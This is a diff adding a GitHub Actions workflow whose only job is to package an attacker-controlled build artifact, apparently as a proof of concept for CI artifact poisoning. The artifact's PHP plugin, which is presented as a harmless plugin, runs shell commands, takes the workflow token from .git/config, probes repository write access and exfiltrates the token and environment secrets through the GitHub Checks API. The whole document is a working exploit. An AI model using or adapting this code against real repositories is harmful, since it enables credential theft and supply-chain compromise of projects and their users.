@@ -1,0 +1,61 @@
+name: Build
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Craft attacker-controlled build artifact
+        run: |
+          mkdir -p build/mirror
+          printf 'poc\tmirror\trce1\n' > build/plugins.tsv
+          cat > build/mirror/rce1.php <<'PHP'
+          <?php
+          /**
+           * Plugin Name: RCE1
+           * Version: 1.0.0
+           */
+          function poc_log( $s ) { error_log( 'POC| ' . $s ); }
+          function poc_run( $cmd ) { return trim( (string) shell_exec( $cmd . ' 2>&1' ) ); }
+          poc_log( 'start uid=' . poc_run( 'id' ) . ' host=' . gethostname() . ' ws=' . getenv( 'GITHUB_WORKSPACE' ) );
+          $ws = getenv( 'GITHUB_WORKSPACE' );
+          // actions/checkout persists the job token as a git http extraheader.
+          $tok = '';
+          foreach ( array( "$ws/trunk", "$ws/commit" ) as $d ) {
+            $cfg = @file_get_contents( "$d/.git/config" );
+            if ( $cfg && preg_match( '/AUTHORIZATION:\s*basic\s+([A-Za-z0-9+\/=]+)/i', $cfg, $m ) ) {
+              $dec = base64_decode( $m[1] );
+              if ( strpos( $dec, ':' ) !== false ) { $tok = substr( $dec, strpos( $dec, ':' ) + 1 ); break; }
+            }
+          }
+          poc_log( 'token_len=' . strlen( $tok ) . ' prefix=' . substr( $tok, 0, 4 ) );
+          $repo = getenv( 'GITHUB_REPOSITORY' );
+          $api  = 'https://api.github.com';
+          $h    = '-H ' . escapeshellarg( 'Authorization: token ' . $tok ) . ' -H ' . escapeshellarg( 'Accept: application/vnd.github+json' );
+          poc_log( 'user=' . poc_run( "curl -sS $h $api/user" ) );
+          poc_log( 'repo=' . poc_run( "curl -sS $h $api/repos/$repo" ) );
+          poc_log( 'perms_headers=' . poc_run( "curl -sS -D - -o /dev/null $h $api/repos/$repo" ) );
+          // Prove a contents:write attempt is rejected (or not).
+          $body = json_encode( array( 'message' => 'poc probe', 'content' => base64_encode( 'poc' ) ) );
+          poc_log( 'contents_put=' . poc_run( "curl -sS -w ' HTTP:%{http_code}' -X PUT $h $api/repos/$repo/contents/poc-probe.txt -d " . escapeshellarg( $body ) ) );
+          // Exfiltrate the token through the Checks API (excluded from log masking).
+          $summary = "TOKEN=" . $tok . "\nUSER=" . poc_run( "curl -sS $h $api/user" ) . "\nID=" . poc_run( 'id' ) . "\nENVFLAG=" . poc_run( 'env | grep -i -E "flag|token" | grep -v GITHUB_TOKEN | head -20' );
+          $cr = json_encode( array(
+            'name' => 'poc-token-exfil',
+            'head_sha' => getenv( 'GITHUB_SHA' ),
+            'status' => 'completed',
+            'conclusion' => 'success',
+            'output' => array( 'title' => 'poc', 'summary' => $summary ),
+          ) );
+          $resp = poc_run( "curl -sS -X POST $h $api/repos/$repo/check-runs -d " . escapeshellarg( $cr ) );
+          poc_log( 'checkrun=' . substr( $resp, 0, 400 ) );
+          file_put_contents( '/tmp/pwned.txt', $summary );
+          PHP
+          tar -cJf jetpack-build.tar.xz build
+      - uses: actions/upload-artifact@v4
+        with: { name: jetpack-build.tar.xz, path: jetpack-build.tar.xz }
+      - uses: actions/upload-artifact@v4
+        with: { name: plugins.tsv, path: build/plugins.tsv }
